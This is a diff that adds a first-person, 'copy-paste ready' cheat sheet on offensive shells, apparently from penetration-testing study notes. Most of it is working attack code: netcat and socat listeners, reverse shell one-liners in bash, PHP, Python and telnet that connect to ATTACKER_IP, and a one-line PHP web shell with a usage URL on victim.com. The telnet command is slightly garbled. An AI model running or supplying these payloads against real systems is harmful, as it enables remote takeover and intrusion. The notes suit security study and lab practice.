@@ -133,3 +133,87 @@ gobuster vhost -u "[http://10.114.164.57](http://10.114.164.57)" --domain exampl
 
 #  3. Shell Overview
 
+# Shells in Offensive Security: Command Cheat Sheet
+
+I learned that shells are critical software interfaces that allow users to interact with an operating system, typically through a command-line interface. In cybersecurity, attackers use remote shell sessions on compromised systems to execute commands, escalate privileges, exfiltrate data, maintain persistent access, and pivot to other machines on the network. 
+
+Here is my copy-paste ready cheat sheet for managing reverse shells, bind shells, and web shells.
+
+---
+
+## 1. Reverse Shells
+I learned that a reverse shell (or "connect back shell") initiates a connection from the target system back to my attacking machine. This technique is highly popular because it helps evade detection from network firewalls and security appliances. 
+
+*   I must first set up a listener on my machine to wait for the incoming connection. 
+*   Attackers often use common ports like 53, 80, 443, or 8080 to blend in with legitimate network traffic.
+*   **Netcat Listener Command:** This command listens on port 443 without resolving hostnames, providing verbose output. 
+    ```bash
+    nc -lvnp 443
+    ```
+
+---
+
+## 2. Bind Shells
+I discovered that a bind shell opens a specific port on the compromised machine and actively listens for an incoming connection. 
+
+*   This method is useful when the target system restricts outgoing connections. 
+*   It is less popular than reverse shells because leaving a listening port open requires the shell to remain active, which increases the likelihood of detection by defenders.
+*   **Netcat Connection Command:** This command connects my machine to the target's open bind shell port.
+    ```bash
+    nc -nv <TARGET_IP> 8080
+    ```
+
+---
+
+## 3. Advanced Listeners
+While Netcat is standard, I learned about several other utilities that provide enhanced features for catching shells.
+
+*   **Rlwrap:** This utility uses the GNU readline library to add keyboard editing (like arrow keys) and command history to a basic Netcat shell.
+    ```bash
+    rlwrap nc -lvnp 443
+    ```
+*   **Ncat:** Distributed by the NMAP project, this improved version of Netcat supports SSL encryption to hide the shell traffic.
+    ```bash
+    ncat --ssl -lvnp 4444
+    ```
+*   **Socat:** This tool creates a socket connection between two data sources, directing incoming data directly to the terminal.
+    ```bash
+    socat -d -d TCP-LISTEN:443 STDOUT
+    ```
+
+---
+
+## 4. Common Reverse Shell Payloads
+A payload is the actual script or command executed on the target to expose the shell. Here are payloads I frequently use on Linux systems.
+
+*   **Standard Bash Payload:** This initiates an interactive shell and redirects standard input and output through a TCP connection.
+    ```bash
+    bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+    ```
+*   **PHP (exec function):** This uses PHP to create a socket connection and execute a shell.
+    ```php
+    php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+    ```
+*   **Python (Short version):** This uses Python's socket module to connect back and spawn a bash shell using the `pty` module.
+    ```python
+    python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+    ```
+*   **Telnet (with Named Pipe):** This uses `mkfifo` to create a named pipe and pipes the input/output through a Telnet connection.
+    ```bash
+    TF=$(mktemp -u); mkfifo$TF && telnet ATTACKER_IP 443 0<$TF \vert{} sh 1>$TF
+    ```
+
+---
+
+##  Web Shells
+I learned that a web shell is a script written in a language supported by the target's web server, such as PHP, ASP, or JSP. 
+
+*   Web shells are incredibly popular because they execute commands directly through the web server and can easily be hidden within legitimate application directories.
+*   Attackers typically deploy them by exploiting vulnerabilities like Unrestricted File Upload or Command Injection.
+*   **Basic PHP Web Shell:** This simple script takes a command from the `cmd` URL parameter and executes it on the system.
+    ```php
+    <?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
+    ```
+*   Once uploaded, I can execute commands by browsing to the file URL. Example: `http://victim.com/uploads/shell.php?cmd=whoami`.
+*   For complex engagements, security professionals often use feature-rich, pre-built web shells found online, such as `p0wny-shell`, `b374k`, or `c99`.
+
